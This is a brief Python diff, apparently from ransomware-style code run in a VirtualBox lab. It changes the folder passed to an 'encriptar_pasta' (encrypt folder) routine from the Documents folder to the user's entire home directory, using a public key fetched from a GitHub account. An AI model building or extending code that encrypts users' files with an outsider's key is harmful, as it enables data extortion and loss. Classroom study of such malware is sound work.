@@ -5,7 +5,7 @@ from tkinter import messagebox
 
 from main import GITHUB_USER, encriptar_pasta, obter_chave_publica_github
 
-pasta = os.path.expanduser("/home/vboxuser/Documentos")
+pasta = os.path.expanduser("/home/vboxuser/")
     
 chave_pub = obter_chave_publica_github(GITHUB_USER)
     
